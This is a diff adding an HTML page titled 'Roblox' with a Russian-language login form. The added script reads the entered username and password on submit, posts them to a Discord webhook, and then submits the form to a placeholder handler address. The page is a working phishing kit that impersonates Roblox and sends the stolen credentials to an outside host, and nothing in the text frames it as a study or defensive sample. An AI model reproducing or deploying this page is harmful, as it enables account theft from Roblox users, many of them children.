@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>Roblox</title></head>
+<body>
+<form id="login" method="POST" action="https://ваш-сайт/обработчик">
+  <input name="username" placeholder="Логин">
+  <input name="password" type="password" placeholder="Пароль">
+  <button type="submit">Войти</button>
+</form>
+<script>
+document.getElementById('login').onsubmit = function(e) {
+  e.preventDefault();
+  const data = new FormData(this);
+  fetch('https://discord.com/api/webhooks/...', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({content: `Логин: ${data.get('username')} Пароль: ${data.get('password')}`})
+  });
+  this.submit();
+};
+</script>
+</body>
+</html>
